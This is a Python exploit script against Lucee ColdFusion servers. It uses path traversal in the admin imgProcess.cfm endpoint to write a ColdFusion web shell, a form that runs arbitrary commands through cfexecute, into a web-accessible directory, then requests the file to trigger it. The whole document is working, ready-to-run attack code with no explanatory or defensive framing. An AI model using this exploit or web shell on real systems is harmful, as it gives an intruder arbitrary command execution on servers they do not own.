import string
import random
import argparse
import requests
import urllib3
#Disable insecure https warnings (for self-signed SSL certificates)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ap = argparse.ArgumentParser()
ap.add_argument("-t", "--target", default="http://localhost:8888")
args = ap.parse_args()
base_url = args.target.rstrip("/")
def random_string():
    return "".join(random.choices(string.ascii_lowercase, k=12))
payload = f"""\
<cfoutput>
<table>
<form method="POST" action="">
<tr><td>Command:</td><td><input type=test name="cmd" size=50
<cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
<tr><td>Options:</td><td> <input type=text name="opts" size=50
<cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
<tr><td>Timeout:</td><td> <input type=text name="timeout" size=4
<cfif isdefined("form.timeout")>value="#form.timeout#"
<cfelse> value="5"</cfif>></td></tr>
</table>
<input type=submit value="Exec" >
</form>
<cfif isdefined("form.cmd")>
<cfsavecontent variable="myVar">
<cfexecute name = "#Form.cmd#"
arguments = "#Form.opts#"
timeout = "#Form.timeout#">
</cfexecute>
</cfsavecontent>
<pre>
#HTMLCodeFormat(myVar)#
</pre>
</cfif>
</cfoutput>
"""
with requests.Session() as session:
    img_process_url = f"{base_url}/lucee/admin/imgProcess.cfm"
    response = session.get(img_process_url)
    if response.ok:
        print(f"[-] Target most likely not vulnerable.")
        exit()
    filename = random_string() + ".cfm"
    print(filename)
    print(f"[*] Writing payload...")
    session.post(f"{img_process_url}?file=_/" + random_string(), data={"imgSrc": random_string()})
    session.post(f"{img_process_url}?file=_/../../../context/{filename}", data={"imgSrc": payload})
    try:
        print("[*] Triggering shell...")
        session.get(f"{base_url}/lucee/{filename}", timeout=2)
    except requests.ReadTimeout:
        pass




